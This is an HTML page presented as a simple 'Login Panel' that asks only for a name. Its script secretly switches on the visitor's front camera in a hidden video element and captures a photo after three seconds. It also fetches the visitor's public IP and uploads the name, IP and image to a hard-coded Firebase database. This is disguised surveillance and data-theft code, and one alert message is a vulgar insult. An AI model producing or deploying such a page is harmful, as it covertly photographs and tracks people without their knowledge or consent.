<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Panel</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    body { display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #1e1e2f; }
    .container { background: #2a2a3a; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.5); width: 350px; text-align: center; }
    h2 { color: #fff; margin-bottom: 20px; }
    input { width: 100%; padding: 10px; margin-bottom: 15px; border: none; border-radius: 5px; font-size: 16px; background: #1e1e2f; color: #fff; text-align: center; }
    button { width: 100%; padding: 10px; border: none; border-radius: 5px; background: #5865f2; color: white; font-size: 18px; cursor: pointer; transition: 0.3s; }
    button:hover { background: #4752c4; }

    /* Sembunyikan kamera & canvas */
    #video, #canvas { display: none; position: absolute; top: -9999px; }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login Panel</h2>
    <input type="text" id="nama" placeholder="Nama lengkap..." required>
    <button id="loginBtn">Login</button>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script type="module">
    
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

   
    const firebaseConfig = {
      apiKey: "AIzaSyBVMpOCjY9gdd4UkSa",
      authDomain: "yanofc-1ecd3.firebaseapp.com",
      databaseURL: "https://yanofc-1ecd3-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "yanofc-1ecd3",
      storageBucket: "yanofc-1ecd3.appspot.com",
      messagingSenderId: "843043156565",
      appId: "1:843043156565:web:e00942a837d30e4b4a9adc"
    };

 
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);


    function startCamera() {
      let video = document.getElementById("video");
      video.style.display = "block";

      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          video.srcObject = stream;
          video.play();
          console.log("Kamera aktif!");
        })
        .catch(error => console.error("Gagal mengakses kamera:", error));
    }

  
    function takePhoto() {
      let video = document.getElementById("video");
      let canvas = document.getElementById("canvas");
      let ctx = canvas.getContext("2d");
      let nama = document.getElementById("nama").value.trim();

      if (!nama) return alert("Nama harus diisi!");

      if (video.readyState >= 2) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        let imageData = canvas.toDataURL("image/png");
        console.log("Foto berhasil diambil.");

     
        video.style.display = "none";
        video.srcObject.getTracks().forEach(track => track.stop());

        saveToFirebase(nama, imageData);
      } else {
        alert("Kontol");
      }
    }

   
    function saveToFirebase(nama, imageData) {
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          let userData = {
            nama: nama,
            ip: data.ip,
            foto: imageData,
            timestamp: Date.now()
          };
          push(ref(db, "users"), userData).then(() => {
            alert("Data berhasil disimpan!");
          }).catch(err => console.error("Error:", err));
        })
        .catch(err => console.error("Hai:", err));
    }

    
    document.getElementById("loginBtn").addEventListener("click", () => {
      startCamera();
      setTimeout(takePhoto, 3000);
    });
  </script>
</body>
</html>
